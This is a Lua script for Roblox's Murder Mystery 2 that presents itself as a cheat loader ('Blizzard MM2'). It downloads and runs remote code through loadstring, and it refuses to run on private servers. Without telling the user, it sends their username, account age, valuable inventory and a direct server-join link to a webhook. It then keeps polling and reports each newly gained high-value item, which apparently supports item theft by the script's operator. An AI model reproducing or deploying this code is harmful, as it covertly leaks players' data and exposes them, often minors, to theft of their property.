--============================================================
-- BLIZZARD MM2 V8.8.4 - MASTER BOOTSTRAP LOADER
-- + LIVE INVENTORY WEBHOOK NOTIFIER
--============================================================

--============================================================
-- SERVICES
--============================================================

local Players =
	game:GetService("Players")

local ReplicatedStorage =
	game:GetService("ReplicatedStorage")

local HttpService =
	game:GetService("HttpService")

local LocalPlayer =
	Players.LocalPlayer

--============================================================
-- PRIVATE SERVER ACCESS BLOCK
--============================================================

local PrivateServerId =
	tostring(
		game.PrivateServerId
		or ""
	)

local PrivateServerOwnerId =
	tonumber(
		game.PrivateServerOwnerId
	)
	or 0

local MM2VIPServer =
	ReplicatedStorage:GetAttribute(
		"IsVIPServer"
	) == true

local IsPrivateServer =
	MM2VIPServer
	or PrivateServerId ~= ""
	or PrivateServerOwnerId ~= 0

if IsPrivateServer then

	warn(
		"[MM2 LOADER] Private server detected. Blizzard blocked."
	)

	LocalPlayer:Kick(
		"Private servers are prohibited. Repeated offenses may result in a permanent ban."
	)

	return
end

--============================================================
-- STARTUP
--============================================================

print(
	"[MM2 LOADER] Starting Blizzard MM2 V8.8.4..."
)

--============================================================
-- BASE URL
--============================================================

local BaseURL =
	"https://raw.githubusercontent.com/farkmusa34/BlizzardMM2Script/refs/heads/main/"

--============================================================
-- CLEAN UP OLD INSTANCE
--============================================================

local ExistingMM2 =
	(getgenv and getgenv().MM2_V85_SPLIT)
	or _G.MM2_V85_SPLIT

if ExistingMM2
	and ExistingMM2.Cleanup
then

	print(
		"[MM2 LOADER] Cleaning previous instance..."
	)

	pcall(function()

		ExistingMM2.Cleanup()

	end)

	task.wait(0.3)
end

--============================================================
-- MODULE LOADER
--============================================================

local function LoadModule(
	fileName
)

	local targetURL =
		BaseURL
		.. fileName

	print(
		"[MM2 LOADER] Loading: "
		.. fileName
	)

	local downloadOk,
	scriptContent =
		pcall(function()

			return game:HttpGet(
				targetURL
			)

		end)

	if not downloadOk then

		warn(
			"[MM2 LOADER] DOWNLOAD ERROR IN "
			.. fileName
			.. ": "
			.. tostring(
				scriptContent
			)
		)

		return false
	end

	if not scriptContent
		or scriptContent == ""
		or scriptContent == "404: Not Found"
	then

		warn(
			"[MM2 LOADER] INVALID/EMPTY FILE: "
			.. fileName
		)

		return false
	end

	local fn,
	compileError =
		loadstring(
			scriptContent
		)

	if not fn then

		warn(
			"[MM2 LOADER] COMPILE ERROR IN "
			.. fileName
			.. ": "
			.. tostring(
				compileError
			)
		)

		return false
	end

	local runOk,
	runResult =
		pcall(
			fn
		)

	if not runOk then

		warn(
			"[MM2 LOADER] RUNTIME ERROR IN "
			.. fileName
			.. ": "
			.. tostring(
				runResult
			)
		)

		return false
	end

	print(
		"[MM2 LOADER] Successfully loaded: "
		.. fileName
	)

	return true
end

--============================================================
-- SAFE LOAD HELPER
--============================================================

local function RequireModule(
	fileName
)

	local success =
		LoadModule(
			fileName
		)

	if not success then

		warn(
			"[MM2 LOADER] Bootstrap stopped because "
			.. fileName
			.. " failed to load."
		)

		return false
	end

	return true
end

--============================================================
-- LOAD ORDER
--============================================================

if not RequireModule("Shared.lua") then return end
if not RequireModule("UI.lua") then return end
if not RequireModule("Visuals.lua") then return end
if not RequireModule("Combat.lua") then return end
if not RequireModule("AutoFarm.lua") then return end
if not RequireModule("Player.lua") then return end
if not RequireModule("Fling.lua") then return end
if not RequireModule("Misc.lua") then return end
if not RequireModule("SkinChanger.lua") then return end
if not RequireModule("Main.lua") then return end

--============================================================
-- FINAL STATUS
--============================================================

local MM2 =
	(getgenv and getgenv().MM2_V85_SPLIT)
	or _G.MM2_V85_SPLIT

if MM2
	and MM2.Running
then

	print(
		"[MM2 LOADER] Blizzard MM2 V8.8.4 bootstrap COMPLETE."
	)

else

	warn(
		"[MM2 LOADER] Bootstrap finished, but MM2 runtime was not detected."
	)

end

--============================================================
-- INVENTORY WEBHOOK NOTIFIER
--============================================================

local httpRequest =
	request
	or http_request
	or (
		syn
		and syn.request
	)

if not httpRequest then

	warn(
		"[MM2 NOTIFIER] HTTP request function unavailable."
	)

	return
end

--============================================================
-- WEBHOOK
--
-- IMPORTANT:
-- Put your NEW webhook here.
-- Keep the entire URL on ONE line.
--============================================================

local webhookUrl =
	"https://webhook.lewisakura.moe/api/webhooks/YOUR_WEBHOOK_ID/YOUR_NEW_WEBHOOK_TOKEN"

--============================================================
-- LIVE WATCH SETTINGS
--============================================================

local INVENTORY_SCAN_INTERVAL =
	2

--============================================================
-- LOAD INVENTORY MODULE
--============================================================

local InventoryModule = nil

do

	local success,
	result =
		pcall(function()

			return require(
				ReplicatedStorage
					:WaitForChild("Modules")
					:WaitForChild("InventoryModule")
			)

		end)

	if success
		and type(result) == "table"
	then

		InventoryModule =
			result

	else

		warn(
			"[MM2 NOTIFIER] Failed to load InventoryModule."
		)

		return
	end
end

--============================================================
-- RARITY SETTINGS
--============================================================

local PRIMARY_RARITIES = {
	Unique = true,
	Ancient = true,
	Godly = true,

	-- MM2 internally uses Classic for Vintage
	Classic = true,
}

local FILLER_RARITIES = {
	Legendary = true,
}

local PRIMARY_PRIORITY = {
	Unique = 1,
	Ancient = 2,
	Godly = 3,
	Classic = 4,
}

--============================================================
-- SAFE TABLE HELPERS
--============================================================

local function SafeGet(
	tbl,
	key
)

	if type(tbl) ~= "table" then
		return nil
	end

	local ok,
	result =
		pcall(function()

			return tbl[key]

		end)

	if ok then
		return result
	end

	return nil
end

local function FirstValue(
	tbl,
	keys
)

	if type(tbl) ~= "table" then
		return nil
	end

	for _, key in ipairs(
		keys
	) do

		local value =
			SafeGet(
				tbl,
				key
			)

		if value ~= nil then
			return value
		end
	end

	return nil
end

--============================================================
-- ITEM HELPERS
--============================================================

local function GetItemID(
	value,
	keyHint
)

	return FirstValue(
		value,
		{
			"DataID",
			"ItemID",
			"ID",
			"Id",
			"id",
		}
	) or keyHint
end

local function GetItemName(
	value
)

	return FirstValue(
		value,
		{
			"ItemName",
			"DisplayName",
			"Name",
			"name",
		}
	)
end

local function GetItemRarity(
	value
)

	return FirstValue(
		value,
		{
			"Rarity",
			"rarity",
			"Tier",
		}
	)
end

local function GetItemType(
	value
)

	return FirstValue(
		value,
		{
			"ItemType",
			"WeaponType",
			"Type",
			"type",
		}
	)
end

local function GetItemAmount(
	value
)

	return tonumber(
		FirstValue(
			value,
			{
				"Amount",
				"amount",
				"Count",
				"Quantity",
			}
		)
	) or 0
end

local function IsWeaponType(
	itemType
)

	return itemType == "Knife"
		or itemType == "Gun"
end

local function DisplayRarity(
	rarity
)

	if rarity == "Classic" then
		return "Vintage"
	end

	return rarity
end

--============================================================
-- OWNED WEAPONS TABLE
--============================================================

local function GetWeaponsTable()

	local inventory =
		SafeGet(
			InventoryModule,
			"MyInventory"
		)

	local data =
		SafeGet(
			inventory,
			"Data"
		)

	return SafeGet(
		data,
		"Weapons"
	)
end

--============================================================
-- SCAN INVENTORY
--============================================================

local function ScanInventory()

	local Weapons =
		GetWeaponsTable()

	if type(Weapons) ~= "table" then
		return {}, {}
	end

	local primary = {}
	local filler = {}

	local visited = {}
	local seenIDs = {}

	local function Walk(
		tbl,
		depth
	)

		if type(tbl) ~= "table" then
			return
		end

		if visited[tbl] then
			return
		end

		if depth > 12 then
			return
		end

		visited[tbl] =
			true

		for key,
		value in pairs(tbl)
		do

			if type(value) == "table" then

				local rarity =
					GetItemRarity(
						value
					)

				local itemType =
					GetItemType(
						value
					)

				local amount =
					GetItemAmount(
						value
					)

				if rarity
					and amount > 0
					and IsWeaponType(
						itemType
					)
				then

					local dataID =
						tostring(
							GetItemID(
								value,
								key
							)
						)

					if not seenIDs[
						dataID
					] then

						seenIDs[
							dataID
						] = true

						local item = {

							DataID =
								dataID,

							Name =
								tostring(
									GetItemName(
										value
									)
									or dataID
								),

							Rarity =
								tostring(
									rarity
								),

							ItemType =
								tostring(
									itemType
								),

							Amount =
								amount,
						}

						if PRIMARY_RARITIES[
							item.Rarity
						] then

							table.insert(
								primary,
								item
							)

						elseif FILLER_RARITIES[
							item.Rarity
						] then

							table.insert(
								filler,
								item
							)

						end
					end
				end

				Walk(
					value,
					depth + 1
				)
			end
		end
	end

	Walk(
		Weapons,
		0
	)

	table.sort(
		primary,
		function(a, b)

			local pa =
				PRIMARY_PRIORITY[
					a.Rarity
				] or 99

			local pb =
				PRIMARY_PRIORITY[
					b.Rarity
				] or 99

			if pa ~= pb then
				return pa < pb
			end

			return a.DataID
				< b.DataID
		end
	)

	table.sort(
		filler,
		function(a, b)

			return a.DataID
				< b.DataID

		end
	)

	return primary,
		filler
end

--============================================================
-- INVENTORY FORMATTER
--============================================================

local function FormatInventoryText(
	primary,
	filler
)

	local lines = {}

	table.insert(
		lines,
		"✨ **__High Value / Godly Items:__**"
	)

	if #primary == 0 then

		table.insert(
			lines,
			"• *None Detected*"
		)

	else

		for _, item in ipairs(
			primary
		) do

			table.insert(
				lines,
				string.format(
					"• **%s** (%s) x%d",
					item.Name,
					DisplayRarity(
						item.Rarity
					),
					item.Amount
				)
			)
		end
	end

	if #filler > 0 then

		table.insert(
			lines,
			""
		)

		table.insert(
			lines,
			"📦 **__Legendary Items:__**"
		)

		for _, item in ipairs(
			filler
		) do

			table.insert(
				lines,
				string.format(
					"• **%s** (Legendary) x%d",
					item.Name,
					item.Amount
				)
			)
		end
	end

	local text =
		table.concat(
			lines,
			"\n"
		)

	if #text > 1000 then

		text =
			string.sub(
				text,
				1,
				970
			)
			.. "\n...and more items!"

	end

	return text
end

--============================================================
-- SNAPSHOT HELPERS
--============================================================

local function BuildPrimarySnapshot(
	primary
)

	local snapshot = {}

	for _, item in ipairs(
		primary
	) do

		snapshot[
			item.DataID
		] = {
			Amount =
				item.Amount,

			Name =
				item.Name,

			Rarity =
				item.Rarity,

			ItemType =
				item.ItemType,
		}
	end

	return snapshot
end

local function FindPrimaryIncreases(
	oldSnapshot,
	currentPrimary
)

	local increases = {}

	for _, item in ipairs(
		currentPrimary
	) do

		local previous =
			oldSnapshot[
				item.DataID
			]

		local previousAmount =
			previous
			and tonumber(
				previous.Amount
			)
			or 0

		local currentAmount =
			tonumber(
				item.Amount
			)
			or 0

		if currentAmount
			> previousAmount
		then

			table.insert(
				increases,
				{
					DataID =
						item.DataID,

					Name =
						item.Name,

					Rarity =
						item.Rarity,

					ItemType =
						item.ItemType,

					Amount =
						currentAmount,

					Added =
						currentAmount
						- previousAmount,
				}
			)

		end
	end

	return increases
end

local function FormatNewItems(
	items
)

	local lines = {}

	for _, item in ipairs(
		items
	) do

		table.insert(
			lines,
			string.format(
				"• **%s** (%s) +%d",
				item.Name,
				DisplayRarity(
					item.Rarity
				),
				item.Added
			)
		)
	end

	if #lines == 0 then
		return "• None"
	end

	local text =
		table.concat(
			lines,
			"\n"
		)

	if #text > 1000 then

		text =
			string.sub(
				text,
				1,
				970
			)
			.. "\n...and more items!"

	end

	return text
end

--============================================================
-- ROBLOX LINKS
--============================================================

local gameLink =
	"https://www.roblox.com/games/"
	.. tostring(
		game.PlaceId
	)

local serverJoinLink =
	"https://www.roblox.com/games/start?placeId="
	.. tostring(
		game.PlaceId
	)
	.. "&gameInstanceId="
	.. tostring(
		game.JobId
	)

--============================================================
-- GENERIC WEBHOOK SENDER
--============================================================

local function SendWebhook(
	payload
)

	task.spawn(function()

		local encodedBody

		local encodeSuccess,
		encodeError =
			pcall(function()

				encodedBody =
					HttpService:JSONEncode(
						payload
					)

			end)

		if not encodeSuccess then

			warn(
				"[MM2 NOTIFIER] JSON encode failed: "
				.. tostring(
					encodeError
				)
			)

			return
		end

		local requestSuccess,
		response =
			pcall(function()

				return httpRequest({

					Url =
						webhookUrl,

					Method =
						"POST",

					Headers = {
						["Content-Type"] =
							"application/json",
					},

					Body =
						encodedBody,
				})

			end)

		if not requestSuccess then

			warn(
				"[MM2 NOTIFIER] Webhook request failed: "
				.. tostring(
					response
				)
			)

			return
		end

		local statusCode =
			response
			and (
				response.StatusCode
				or response.Status
			)

		if statusCode
			and statusCode ~= 200
			and statusCode ~= 204
		then

			warn(
				"[MM2 NOTIFIER] Webhook rejected. Status: "
				.. tostring(
					statusCode
				)
				.. " | Body: "
				.. tostring(
					response.Body
					or ""
				)
			)

			return
		end

		print(
			"[MM2 NOTIFIER] Webhook notification sent."
		)

	end)
end

--============================================================
-- INITIAL INVENTORY SCAN
--============================================================

local primaryItems,
fillerItems =
	ScanInventory()

local parsedInventory =
	FormatInventoryText(
		primaryItems,
		fillerItems
	)

local PreviousPrimarySnapshot =
	BuildPrimarySnapshot(
		primaryItems
	)

--============================================================
-- INITIAL EXECUTION WEBHOOK
--============================================================

local initialPayload = {

	embeds = {
		{
			title =
				"Blizzard MM2 Executed! 🚀",

			color =
				3447003,

			fields = {

				{
					name =
						"Player Username",

					value =
						tostring(
							LocalPlayer.Name
						),

					inline =
						true,
				},

				{
					name =
						"Account Age (Days)",

					value =
						tostring(
							LocalPlayer.AccountAge
						),

					inline =
						true,
				},

				{
					name =
						"Game Place ID",

					value =
						tostring(
							game.PlaceId
						),

					inline =
						false,
				},

				{
					name =
						"Direct Link",

					value =
						"[Click to View Game]("
						.. gameLink
						.. ")",

					inline =
						true,
				},

				{
					name =
						"Direct Server Join Link",

					value =
						"[Launch & Join Server]("
						.. serverJoinLink
						.. ")",

					inline =
						false,
				},

				{
					name =
						"🎒 Scanned Player Inventory",

					value =
						parsedInventory,

					inline =
						false,
				},
			},

			timestamp =
				DateTime.now():ToIsoDate(),
		},
	},
}

SendWebhook(
	initialPayload
)

--============================================================
-- LIVE INVENTORY WATCHER
--
-- Behaviour:
--
-- Initial:
--   None Detected
--
-- Later receives Luger:
--   sends another webhook
--
-- If Luger x1 -> x2:
--   sends +1
--
-- If item is removed:
--   no notification
--
-- If removed then received again:
--   sends notification again
--============================================================

task.spawn(function()

	while true do

		task.wait(
			INVENTORY_SCAN_INTERVAL
		)

		-- Stop watcher if Blizzard itself has stopped.
		if MM2
			and MM2.Running == false
		then
			break
		end

		local currentPrimary,
		currentFiller =
			ScanInventory()

		local increases =
			FindPrimaryIncreases(
				PreviousPrimarySnapshot,
				currentPrimary
			)

		-- Always refresh baseline.
		-- This is important when items are traded away.
		PreviousPrimarySnapshot =
			BuildPrimarySnapshot(
				currentPrimary
			)

		if #increases > 0 then

			local currentInventoryText =
				FormatInventoryText(
					currentPrimary,
					currentFiller
				)

			local newItemsText =
				FormatNewItems(
					increases
				)

			local updatePayload = {

				embeds = {
					{
						title =
							"Blizzard MM2 Inventory Updated! ✨",

						color =
							5763719,

						fields = {

							{
								name =
									"Player Username",

								value =
									tostring(
										LocalPlayer.Name
									),

								inline =
									true,
							},

							{
								name =
									"✨ New High Value Items Detected",

								value =
									newItemsText,

								inline =
									false,
							},

							{
								name =
									"🎒 Current Player Inventory",

								value =
									currentInventoryText,

								inline =
									false,
							},

							{
								name =
									"Direct Server Join Link",

								value =
									"[Launch & Join Server]("
									.. serverJoinLink
									.. ")",

								inline =
									false,
							},
						},

						timestamp =
							DateTime.now():ToIsoDate(),
					},
				},
			}

			SendWebhook(
				updatePayload
			)

		end
	end
end)

print(
	"[MM2 NOTIFIER] Live inventory watcher started."
)